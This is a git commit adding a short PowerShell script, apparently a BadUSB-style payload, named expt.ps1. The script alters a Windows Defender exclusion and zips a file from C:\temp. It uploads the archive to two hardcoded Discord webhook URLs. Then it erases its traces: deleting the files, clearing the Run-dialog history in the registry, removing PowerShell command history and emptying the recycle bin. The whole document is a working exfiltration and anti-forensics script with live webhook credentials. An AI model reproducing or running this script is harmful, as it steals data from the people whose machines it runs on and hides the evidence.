31a9685fbc103380febb4da9e2f785ef98478f79
ginogigi97 <157972247+ginogigi97@users.noreply.github.com>
2024-01-28 15:47:48 +0100

    Create expt.ps1

---
+++ expt.ps1
@@ -0,0 +1,22 @@
+Remove-MpPreference -ExclusionPath “C:”
+$hookurl='https://discord.com/api/webhooks/1201175701563383979/fmbj3ItMmfq79ds-7vVtgDD28nUqY3RfpN72t6LZsJs9dXG3nHeRlgk_Eyzq_5UMK8v9'
+$hookurl2='https://discord.com/api/webhooks/1189972666506039399/noWdQFFczREOMIlEBSeX4kwfMaDTRr7rSAWD9_kgG--ZeM8wf4MxIds88dGQYoPl9wOq'
+$fileSaveDir = 'C:\temp'
+$date = get-date
+$filename = 'j'
+$filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % {$_.FullName}
+Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
+$Body = @{'username' = $env:username; 'content' = "Magia pura"}
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post; curl.exe -F 'file1=@c:\export.zip' $hookurl
+Start-Sleep -Seconds 1.5
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post; curl.exe -F 'file1=@c:\export.zip' $hookurl2
+rm -r C:\temp
+rm -r C:\export.zip
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+EXIT
